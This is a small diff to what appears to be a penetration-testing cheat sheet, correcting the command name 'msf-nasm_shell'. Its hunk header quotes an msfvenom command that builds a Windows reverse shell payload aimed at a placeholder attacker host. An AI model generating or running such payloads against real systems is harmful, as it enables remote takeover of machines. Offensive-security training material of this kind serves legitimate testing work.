@@ -1681,7 +1681,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f hta-p
 ## MSF-NASM_SHELL
 ```bash
 # find hex opcode for assembly instruction
-msf-nsm_shell
+msf-nasm_shell
 assembly_instruction_here
 ```
 
